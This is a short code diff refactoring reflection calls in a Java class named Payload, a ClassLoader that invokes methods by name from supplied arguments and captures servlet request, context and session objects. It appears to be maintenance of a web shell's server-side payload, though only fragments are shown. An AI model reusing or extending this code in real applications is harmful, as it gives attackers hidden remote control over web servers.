@@ -77,7 +77,7 @@ public class Payload extends ClassLoader {
         }
         if (methodName != null) {
             if (className == null) {
-                Method method = getClass().getMethod(methodName, null);
+                Method method = getClass().getMethod(methodName);
                 Class<?> returnType = method.getReturnType();
                 Class<?> cls = class$0;
                 if (cls == null) {
@@ -89,7 +89,7 @@ public class Payload extends ClassLoader {
                     }
                 }
                 if (returnType.isAssignableFrom(cls)) {
-                    return (byte[]) method.invoke(this, null);
+                    return (byte[]) method.invoke(this);
                 }
                 return "this method returnType not is byte[]".getBytes();
             }
@@ -251,13 +251,13 @@ public class Payload extends ClassLoader {
             Method getServletContextMethod = getMethodByClass(obj.getClass(), "getServletContext", null);
             Method getSessionMethod = getMethodByClass(obj.getClass(), "getSession", null);
             if (getRequestMethod != null && this.servletRequest == null) {
-                this.servletRequest = getRequestMethod.invoke(obj, null);
+                this.servletRequest = getRequestMethod.invoke(obj);
             }
             if (getServletContextMethod != null && this.servletContext == null) {
-                this.servletContext = getServletContextMethod.invoke(obj, null);
+                this.servletContext = getServletContextMethod.invoke(obj);
             }
             if (getSessionMethod != null && this.httpSession == null) {
-                this.httpSession = getSessionMethod.invoke(obj, null);
+                this.httpSession = getSessionMethod.invoke(obj);
             }
         } catch (Exception e) {
         }
@@ -758,7 +758,7 @@ public class Payload extends ClassLoader {
                 int argsCount = Integer.parseInt(argsCountStr);
                 if (argsCount > 0) {
                     for (int i = 0; i < argsCount; i++) {
-                        String val = get(String.format("arg-%d", new Integer(i)));
+                        String val = get(String.format("arg-%d", i));
                         if (val != null) {
                             argsList.add(val);
                         }
@@ -1053,7 +1053,7 @@ public class Payload extends ClassLoader {
                         }
                     }
                     if (returnType.isAssignableFrom(cls2)) {
-                        return (Map) method.invoke(null, null);
+                        return (Map) method.invoke(null);
                     }
                     return null;
                 } catch (Exception e) {
